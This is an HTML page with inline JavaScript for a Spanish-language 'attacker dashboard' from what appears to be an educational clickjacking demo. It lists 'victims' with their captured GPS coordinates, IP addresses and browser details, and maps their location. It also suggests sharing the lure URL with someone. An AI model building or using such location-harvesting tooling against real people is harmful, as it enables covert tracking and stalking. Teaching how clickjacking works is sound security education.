<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéØ Dashboard del Atacante</title>
    <link
        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="css/dashboard.css">
</head>

<body>
    <!-- Terminal-style header -->
    <header class="dash-header">
        <div class="terminal-dots">
            <span class="dot red"></span>
            <span class="dot yellow"></span>
            <span class="dot green"></span>
        </div>
        <div class="header-title">
            <span class="blink">‚ñ∂</span> CLICKJACKING_MONITOR <span class="version">v1.0</span>
        </div>
        <div class="header-actions">
            <button class="btn-clear" onclick="clearData()">
                <span class="material-icons">delete_sweep</span> Limpiar
            </button>
        </div>
    </header>

    <main class="dash-main">
        <!-- Stats row -->
        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-icon"><span class="material-icons">people</span></div>
                <div class="stat-value" id="totalVictims">0</div>
                <div class="stat-label">V√≠ctimas</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><span class="material-icons">gps_fixed</span></div>
                <div class="stat-value" id="totalLocations">0</div>
                <div class="stat-label">Con Ubicaci√≥n</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon"><span class="material-icons">gps_off</span></div>
                <div class="stat-value" id="totalDenied">0</div>
                <div class="stat-label">Denegaron</div>
            </div>
            <div class="stat-card pulse-card">
                <div class="stat-icon"><span class="material-icons">sensors</span></div>
                <div class="stat-value live-indicator">LIVE</div>
                <div class="stat-label">Monitoreando</div>
            </div>
        </div>

        <!-- Two-column layout -->
        <div class="content-grid">
            <!-- Location log -->
            <div class="panel log-panel">
                <div class="panel-header">
                    <span class="material-icons">terminal</span>
                    <h2>Log de Capturas</h2>
                    <span class="auto-refresh">‚ü≥ Auto-refresh 3s</span>
                </div>
                <div class="log-entries" id="logEntries">
                    <div class="empty-state">
                        <span class="material-icons">hourglass_empty</span>
                        <p>Esperando v√≠ctimas...</p>
                        <p class="hint">Comparte <code>http://localhost:3000</code> con alguien</p>
                    </div>
                </div>
            </div>

            <!-- Map panel -->
            <div class="panel map-panel">
                <div class="panel-header">
                    <span class="material-icons">map</span>
                    <h2>Mapa de Ubicaciones</h2>
                </div>
                <div class="map-container" id="mapContainer">
                    <div class="empty-state">
                        <span class="material-icons">explore</span>
                        <p>El mapa aparecer√° cuando se capture una ubicaci√≥n</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Educational banner -->
        <div class="edu-banner">
            <span class="material-icons">school</span>
            <div>
                <strong>‚ö†Ô∏è Esto es una demostraci√≥n educativa</strong>
                <p>Toda la informaci√≥n se almacena solo en memoria local y se borra al reiniciar el servidor. No se
                    env√≠a nada a servidores externos.</p>
            </div>
        </div>
    </main>

    <script>
        let previousCount = 0;

        async function fetchLocations() {
            try {
                const res = await fetch('/api/locations');
                const data = await res.json();
                updateUI(data);
            } catch (e) {
                console.error('Error fetching:', e);
            }
        }

        function updateUI(locations) {
            const totalVictims = document.getElementById('totalVictims');
            const totalLocations = document.getElementById('totalLocations');
            const totalDenied = document.getElementById('totalDenied');
            const logEntries = document.getElementById('logEntries');
            const mapContainer = document.getElementById('mapContainer');

            const withLocation = locations.filter(l => l.latitude !== 'DENEGADO');
            const denied = locations.filter(l => l.latitude === 'DENEGADO');

            totalVictims.textContent = locations.length;
            totalLocations.textContent = withLocation.length;
            totalDenied.textContent = denied.length;

            // Animate new entries
            if (locations.length > previousCount) {
                totalVictims.classList.add('flash');
                setTimeout(() => totalVictims.classList.remove('flash'), 600);
            }
            previousCount = locations.length;

            if (locations.length === 0) {
                logEntries.innerHTML = `
          <div class="empty-state">
            <span class="material-icons">hourglass_empty</span>
            <p>Esperando v√≠ctimas...</p>
            <p class="hint">Comparte <code>http://localhost:3000</code></p>
          </div>`;
                mapContainer.innerHTML = `
          <div class="empty-state">
            <span class="material-icons">explore</span>
            <p>El mapa aparecer√° cuando se capture una ubicaci√≥n</p>
          </div>`;
                return;
            }

            // Render log entries
            logEntries.innerHTML = locations.map((loc, i) => {
                const time = new Date(loc.capturedAt).toLocaleTimeString('es-MX');
                const isNew = i === locations.length - 1 && locations.length > previousCount - 1;
                const isDenied = loc.latitude === 'DENEGADO';

                if (isDenied) {
                    return `
            <div class="log-entry denied ${isNew ? 'entry-new' : ''}">
              <div class="entry-header">
                <span class="entry-id">#${loc.id}</span>
                <span class="entry-time">${time}</span>
                <span class="badge denied-badge">DENEGADO</span>
              </div>
              <div class="entry-body">
                <div class="entry-line"><span class="key">Estado:</span> <span class="val-denied">Ubicaci√≥n denegada por el usuario</span></div>
                <div class="entry-line"><span class="key">IP:</span> <span class="val">${loc.ip}</span></div>
                <div class="entry-line"><span class="key">UA:</span> <span class="val ua">${loc.userAgent.substring(0, 80)}...</span></div>
              </div>
            </div>`;
                }

                return `
          <div class="log-entry success ${isNew ? 'entry-new' : ''}">
            <div class="entry-header">
              <span class="entry-id">#${loc.id}</span>
              <span class="entry-time">${time}</span>
              <span class="badge success-badge">CAPTURADO</span>
            </div>
            <div class="entry-body">
              <div class="entry-line"><span class="key">Lat:</span> <span class="val highlight">${loc.latitude}</span></div>
              <div class="entry-line"><span class="key">Lng:</span> <span class="val highlight">${loc.longitude}</span></div>
              <div class="entry-line"><span class="key">Precisi√≥n:</span> <span class="val">${loc.accuracy ? loc.accuracy.toFixed(1) + 'm' : 'N/A'}</span></div>
              <div class="entry-line"><span class="key">IP:</span> <span class="val">${loc.ip}</span></div>
              <div class="entry-line"><span class="key">UA:</span> <span class="val ua">${loc.userAgent.substring(0, 80)}...</span></div>
              <div class="entry-line">
                <a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" class="map-link">
                  <span class="material-icons">open_in_new</span> Ver en Google Maps
                </a>
              </div>
            </div>
          </div>`;
            }).reverse().join('');

            // Update map with last valid location
            const lastValid = withLocation[withLocation.length - 1];
            if (lastValid) {
                mapContainer.innerHTML = `
          <iframe 
            width="100%" 
            height="100%" 
            frameborder="0" 
            scrolling="no" 
            src="https://www.openstreetmap.org/export/embed.html?bbox=${lastValid.longitude - 0.01},${lastValid.latitude - 0.01},${lastValid.longitude + 0.01},${lastValid.latitude + 0.01}&layer=mapnik&marker=${lastValid.latitude},${lastValid.longitude}"
            style="border-radius: 8px;">
          </iframe>
          <div class="map-coords">
            üìç ${lastValid.latitude.toFixed(6)}, ${lastValid.longitude.toFixed(6)}
          </div>`;
            }
        }

        async function clearData() {
            if (confirm('¬øBorrar todos los datos capturados?')) {
                await fetch('/api/locations', { method: 'DELETE' });
                previousCount = 0;
                fetchLocations();
            }
        }

        // Initial fetch + auto-refresh
        fetchLocations();
        setInterval(fetchLocations, 3000);
    </script>
</body>

</html>